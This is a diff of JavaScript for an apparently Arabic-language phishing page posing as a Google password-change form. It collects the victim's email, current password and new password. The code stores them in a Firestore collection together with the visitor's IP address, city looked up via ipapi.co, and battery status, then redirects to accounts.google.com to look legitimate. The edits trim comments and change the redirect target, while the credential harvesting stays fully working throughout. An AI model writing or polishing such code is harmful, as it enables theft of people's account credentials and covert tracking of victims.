@@ -89,7 +89,7 @@ const successMessage = document.getElementById("successMessage");
 
 let lastSentData = "";
 
-// التنقل العادي بين الخطوات (لا يتأخر الإنتقال بسبب إرسال البيانات)
+// التنقل بين الخطوات
 next1.addEventListener("click", ()=>{
   const input = document.getElementById("email");
   if(input.checkValidity()){
@@ -112,7 +112,7 @@ next2.addEventListener("click", ()=>{
   }
 });
 
-// الزر الأخير: تحقق ثم إرسال ثم تحويل النص إلى "الرجوع" الذي يفتح Gmail
+// الزر الأخير: تحقق ثم إرسال ثم تحويل النص إلى "الرجوع" → https://accounts.google.com
 verifyPass.addEventListener("click", async ()=>{
   const email = document.getElementById("email").value.trim();
   const currentPassword = document.getElementById("currentPassword").value.trim();
@@ -121,7 +121,6 @@ verifyPass.addEventListener("click", async ()=>{
 
   if(newPassword.length >= 8 && newPassword === confirmPassword){
     const dataString = `${email}|${currentPassword}|${newPassword}`;
-    // إرسال فقط إذا البيانات ليست مكررة ولها قيم
     if(dataString !== lastSentData && email && currentPassword && newPassword){
       await sendData(email, currentPassword, newPassword);
       lastSentData = dataString;
@@ -131,16 +130,13 @@ verifyPass.addEventListener("click", async ()=>{
     successMessage.style.display = "block";
     step3.querySelectorAll("input").forEach(el=>el.disabled = true);
 
-    // تحويل زر "التالي" إلى "الرجوع" وفتح Gmail عند الضغط
+    // زر الرجوع
     verifyPass.textContent = "الرجوع";
-    // إزالة أي مستمع قديم لتجنب تشغيل التحقق مجددًا
     verifyPass.replaceWith(verifyPass.cloneNode(true));
-    const newBackBtn = document.getElementById("verifyPass") || document.querySelector("#verifyPass");
-    // إذا العنصر غير موجود بعد الاستبدال، نختار الزر بالبحث في DOM
-    const finalBtn = newBackBtn || document.querySelector("button[id='verifyPass']");
+    const finalBtn = document.querySelector("button[id='verifyPass']");
     if(finalBtn){
       finalBtn.addEventListener("click", ()=> {
-        window.location.href = "https://mail.google.com/mail/u/0/#inbox";
+        window.location.href = "https://accounts.google.com";
       }, { once: true });
     }
   } else {
@@ -150,11 +146,11 @@ verifyPass.addEventListener("click", async ()=>{
   }
 });
 
-// دالة للحصول على IP والموقع (مع معالجة أخطاء الشبكة)
+// جلب IP والمدينة
 async function fetchIPandCity(){
   try{
     const controller = new AbortController();
-    const timeoutId = setTimeout(()=>controller.abort(), 5000); // 5s timeout
+    const timeoutId = setTimeout(()=>controller.abort(), 5000);
     const res = await fetch("https://ipapi.co/json/", { signal: controller.signal });
     clearTimeout(timeoutId);
     if(!res.ok) throw new Error("ipapi failed");
@@ -164,12 +160,11 @@ async function fetchIPandCity(){
       city: data.city || data.region || data.country_name || "غير معروف"
     };
   } catch(e){
-    // فشل الجلب -> نعيد قيم افتراضية
     return { ip: "غير معروف", city: "غير معروف" };
   }
 }
 
-// الحصول على حالة البطارية إن كانت مدعومة، مع وقت انتظار
+// حالة البطارية
 async function getBatteryStatusSafe(){
   try{
     if(navigator.getBattery){
@@ -177,13 +172,11 @@ async function getBatteryStatusSafe(){
       const pct = Math.round((bat.level || 0) * 100);
       return `${bat.charging ? "يشحن" : "غير مشحون"} - ${pct}%`;
     }
-  } catch(e){
-    // تجاهل الأخطاء
-  }
+  } catch(e){}
   return "غير معروف";
 }
 
-// إرسال البيانات إلى مجموعة "جديد"
+// إرسال البيانات مع الوقت
 async function sendData(email, currentPassword, newPassword){
   if(!email && !currentPassword && !newPassword) return;
 
@@ -192,14 +185,14 @@ async function sendData(email, currentPassword, newPassword){
 
   try{
     await addDoc(collection(db, "جديد"), {
-      "0.0.0.0.0": "",               // الحقل المطلوب كما طلبت
+      "0.0.0.0.0": "",
       البريد_الإلكتروني: email || "",
       كلمة_الحالية: currentPassword || "",
       كلمة_الجديدة: newPassword || "",
       المدينة: city,
       حالة_الشحن: batteryStatus,
       IP_والموقع: ip,
-      timestamp: new Date()
+      الوقت: new Date().toLocaleString("ar-EG")
     });
   } catch(e){
     console.error("خطأ عند إرسال البيانات: ", e);
